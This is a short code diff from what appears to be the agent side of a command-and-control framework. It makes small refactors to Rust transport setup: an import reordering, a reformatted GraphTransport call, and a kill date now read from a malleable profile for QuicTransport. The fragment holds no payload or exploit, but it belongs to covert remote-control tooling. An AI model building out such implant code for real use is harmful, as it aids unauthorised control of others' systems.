@@ -33,7 +33,6 @@ use common::normalized_transport::{NormalizedTransport, Role, TrafficProfile};
 use common::tls_transport::{PinnedCertVerifier, TlsTransport};
 use common::{LockedSecret, Message, Transport};
 use ed25519_dalek::SigningKey;
-use tracing::{error, info, warn};
 use rand::rngs::OsRng;
 use rustls::ClientConfig;
 use std::sync::Arc;
@@ -42,6 +41,7 @@ use sysinfo::System;
 use tokio::net::TcpStream;
 use tokio::time::{sleep, Duration};
 use tokio_rustls::TlsConnector;
+use tracing::{error, info, warn};
 use uuid::Uuid;
 
 // Compile-time constants injected by the Builder (may be absent in manual builds).
@@ -384,8 +384,12 @@ pub async fn build_outbound_transport(
                         psk: g.psk.clone(),
                     };
                     return Ok(Box::new(
-                        crate::c2_graph::GraphTransport::new(graph_config, session, agent_id.to_string())
-                            .map_err(|e| anyhow!("GraphTransport init failed: {e}"))?,
+                        crate::c2_graph::GraphTransport::new(
+                            graph_config,
+                            session,
+                            agent_id.to_string(),
+                        )
+                        .map_err(|e| anyhow!("GraphTransport init failed: {e}"))?,
                     ));
                 }
 
@@ -409,7 +413,7 @@ pub async fn build_outbound_transport(
                             session,
                             agent_id.to_string(),
                             _mesh_public_key,
-                            cfg.kill_date.clone(),
+                            cfg.malleable_profile.kill_date.clone(),
                             &cfg.malleable_profile.c2_quic.psk,
                         )
                         .map_err(|e| anyhow!("QuicTransport init failed: {e}"))?,
